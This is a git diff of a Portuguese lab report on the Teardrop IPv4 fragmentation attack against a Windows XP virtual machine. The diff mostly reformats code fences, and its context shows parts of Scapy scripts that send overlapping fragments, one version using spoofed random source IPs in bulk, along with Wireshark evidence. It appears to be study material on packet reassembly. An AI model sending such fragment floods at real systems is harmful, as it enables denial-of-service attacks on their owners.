@@ -1,6 +1,6 @@
 # Relatorio de Ataque de Fragmentação IPv4 (Teardrop)
 
-## 1. Introdução 
+## 1. Introdução
 Este experimento surgiu da necessidade de compreender a estrutura de dados de um datagrama IPv4, mais do que da exploração da vulnerabilidade em si. Para os testes, foram utilizados sistemas operativos acessíveis em ambiente laboratorial, incluindo um Windows XP Pro SP1 em máquina virtual (VM) e o Windows 10 Pro como host.
 
 ## 2. Objetivo 
@@ -13,8 +13,9 @@ Instruções
 Reconfiguração do VMnet0 (VMware -> Edit -> Virtual Network Editor).
 Reinstalação do VMware Bridge Protocol (Control Panel -> Network and Internet -> Network Connections -> click no rato com botao direito-> Properties).
 Inicialização manual do serviço:
-	net start vmnetbridge
-	
+```bash
+    net start vmnetbridge
+```
 ## 4. Strategy of Attack
 O ataque Teardrop explora a reassembly de pacotes fragmentados. Se os fragmentos se sobrepõem, os sistemas vulneráveis podem tentar alocar memória negativa ou copiar dados para fora dos limites do buffer, o que pode resultar em Kernel Panic ou BSOD (Tela Azul).
 
@@ -22,7 +23,7 @@ O ataque Teardrop explora a reassembly de pacotes fragmentados. Se os fragmentos
 	
 	Script v1: Foca na validação da sobreposição. Ao definir frag=1 (offset de 8 bytes) para um segundo pacote enquanto o primeiro ainda está a ser processado, assim forçamos o sistema a lidar com uma sobreposição de 1344 bytes.
 	
-    ```python
+```python
             from scapy.all import *
                                                                                         
             p1 = IP(dst="<Target_IP>", flags=1)/UDP(sport=123, dport=80)/("A"*1400)                              
@@ -33,7 +34,7 @@ O ataque Teardrop explora a reassembly de pacotes fragmentados. Se os fragmentos
                                                                                         
             send(p1, iface="en0")         
             send(p2, iface="en0")    
-		                                                  
+```                                             
 	Traffic Evidence Captured in Wireshark (Script v1 - Target: windows XP Pro)
 	
 		Frame: 1
@@ -81,7 +82,7 @@ O ataque Teardrop explora a reassembly de pacotes fragmentados. Se os fragmentos
 		
 	Script v2: Automatiza o processo com IP Spoofing (RandIP) e envio em massa. Isso testa não apenas a lógica de remontagem, mas também a exaustão de recursos do sistema ao manter múltiplos estados de "pacotes incompletos" na memória.
 	
-    ```python
+```python
 			from scapy.all import *
 			import time
 			import random
@@ -100,7 +101,7 @@ O ataque Teardrop explora a reassembly de pacotes fragmentados. Se os fragmentos
 			            
 			except KeyboardInterrupt:
 			    print("\nAttack interrupted.")	
-	
+```
 	Traffic Evidence (Script v2 - Target: windows XP Pro)
 	
 		Frame: 13006545
